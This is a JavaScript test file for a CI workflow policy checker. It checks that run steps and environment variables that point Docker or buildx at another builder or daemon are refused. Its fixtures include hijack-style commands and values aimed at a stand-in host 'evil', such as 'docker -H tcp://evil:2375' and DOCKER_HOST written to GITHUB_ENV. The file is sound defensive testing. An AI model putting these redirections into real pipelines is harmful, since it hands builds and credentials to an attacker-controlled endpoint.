// Run steps and env that select another builder or Docker endpoint (#488).
import assert from "node:assert/strict";
import { join } from "node:path";
import { test } from "node:test";
import { loadWorkflow } from "./lib.mjs";
import { COMPOSE_FILE, buildChecks, withStep } from "./policy.mjs";

test("fixtures: a run step that selects another builder or Docker endpoint is refused (#488 review 4)", () => {
  for (const run of ["docker buildx create --use --driver remote tcp://evil:1234", "docker buildx use evil", "docker buildx create --name x --driver kubernetes", "docker context create evil --docker host=tcp://evil:2375",
    "docker context use evil", "docker --context evil buildx version", "docker -c evil ps", "docker buildx --builder evil du", "docker -H tcp://evil:2375 ps", "docker --host=tcp://evil:2375 ps"]) {
    assert.match(buildChecks("ci", withStep("ci", "staging-image", { run })).join(), /selects a builder or Docker endpoint/, run);
  }
});

test("fixtures: env that selects a builder or changes the Docker client is refused (#488 review 5)", () => {
  const cases = [
    ["workflow env DOCKER_HOST", d => { d.env = { DOCKER_HOST: "tcp://evil:2375" }; }],
    ["job env BUILDX_BUILDER", d => { d.jobs["staging-image"].env.BUILDX_BUILDER = "evil"; }],
    ["step env DOCKER_CONTEXT", d => { d.jobs["staging-image"].steps[2].env = { DOCKER_CONTEXT: "evil" }; }],
    ["step env BUILDKIT_PROGRESS", d => { d.jobs["staging-image"].steps[2].env = { BUILDKIT_PROGRESS: "plain" }; }],
    ["job env DOCKER_BUILDKIT", d => { d.jobs["staging-image"].env.DOCKER_BUILDKIT = "0"; }],
    ["job env DOCKER_CONFIG", d => { d.jobs["staging-image"].env.DOCKER_CONFIG = "/tmp/evil"; }],
    ["step env COMPOSE_FILE", d => { d.jobs["staging-image"].steps.push({ env: { COMPOSE_FILE: "/tmp/evil.yml" }, run: "python3 scripts/staging.py up" }); }],
    ["DOCKER_HOST written to GITHUB_ENV", d => { d.jobs["staging-image"].steps.push({ run: 'echo "DOCKER_HOST=tcp://evil:2375" >> "$GITHUB_ENV"' }); }],
    ["BUILDX_CONFIG exported", d => { d.jobs["staging-image"].steps.push({ run: "export BUILDX_CONFIG=/tmp/evil" }); }],
    ["DOCKER_CONFIG outside the listed publish steps", d => { d.jobs["staging-image"].steps.push({ run: 'export DOCKER_CONFIG="$RUNNER_TEMP/x"' }); }],
  ];
  for (const [label, mutate] of cases) {
    const data = structuredClone(loadWorkflow("ci"));
    mutate(data);
    assert.match(buildChecks("ci", data).join(), /selects a builder or changes the Docker client/, label);
  }
});
